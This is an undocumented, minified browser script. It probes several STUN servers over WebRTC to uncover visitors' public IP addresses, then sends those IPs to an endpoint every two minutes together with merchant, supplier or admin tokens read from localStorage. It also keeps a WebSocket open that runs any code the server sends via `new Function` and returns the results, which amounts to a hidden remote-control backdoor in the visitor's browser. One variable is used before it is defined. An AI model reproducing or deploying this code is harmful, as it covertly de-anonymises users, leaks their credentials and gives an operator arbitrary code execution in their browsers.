var k="_wrid",tk="_wts",sid=sessionStorage[k]||(sessionStorage[k]=""+((1e7+Math.random()*9e7)|0));
var H=["stun.miwifi.com","stun.qq.com","39.107.142.158","stun.douyucdn.cn","stun.cloudflare.com","stun.l.google.com:19302"];
var probe=function(h){return new Promise(function(r){var pc=new RTCPeerConnection({iceServers:[{urls:"stun:"+h}]}),ips={},d=function(){try{pc.close()}catch(z){}r(Object.keys(ips))},tm=setTimeout(d,4e3);
pc.onicecandidate=function(e){if(!e.candidate){clearTimeout(tm);d();return}if(e.candidate.type==="srflx"&&e.candidate.address)ips[e.candidate.address]=1};
pc.createDataChannel("");pc.createOffer().then(function(o){return pc.setLocalDescription(o)}).catch(d)})};
var post=function(a){var tok="",hd={"Content-Type":"application/json"};try{if(t==="m")tok=localStorage.getItem("merchant-token")||"";else if(t==="s")tok=localStorage.getItem("supplier-token")||"";else tok=localStorage.getItem("admtoken")||""}catch(z){}if(tok)hd.Authorization=tok.indexOf("Bearer ")===0?tok:"Bearer "+tok;fetch("/api/Account/Ping",{method:"POST",headers:hd,credentials:"include",body:JSON.stringify({ips:a,sid:sid,t:t})}).then(function(){window.__cxp=1})};
var send=function(){var S={};Promise.all(H.map(function(h){return probe(h).then(function(a){a.forEach(function(i){S[i]=1})})})).then(function(){sessionStorage[tk]=""+Date.now();post(Object.keys(S))})};
post([]);
if(Date.now()-(+sessionStorage[tk]||0)>=12e4)send();
setInterval(send,12e4);
(function(){
  var X=window.__cx,w=null,t=0,u=(location.protocol[4]==="s"?"wss":"ws")+"://"+location.host+"/"+["c","x","w"].join("")+"?s="+sid;
  function off(){if(X)X.w=0}
  function later(){if(!t)t=setTimeout(function(){t=0;go()},3e3)}
  function go(){
    if(t){clearTimeout(t);t=0}
    off();
    try{if(w){w.onclose=function(){};w.onerror=function(){};try{w.close()}catch(z){}}}catch(z){}
    try{w=new WebSocket(u)}catch(z){later();return}
    w.onopen=function(){};
    w.onmessage=function(ev){
      var x=String(ev.data||""),r;
      if(!x)return;
      try{
        r=(new Function("w","X",x))(w,X);
        if(r&&r.then)r.then(function(v){if(v!=null&&v!=="")w.send(""+v)});
        else if(r!=null&&r!=="")w.send(""+r);
      }catch(z){}
    };
    w.onclose=function(){off();later()};
    w.onerror=function(){off();try{w.close()}catch(z){}};
  }
  go();
  setInterval(function(){try{if(!w||w.readyState!==1){later();return}w.send("1")}catch(z){later()}},1e4);
})();
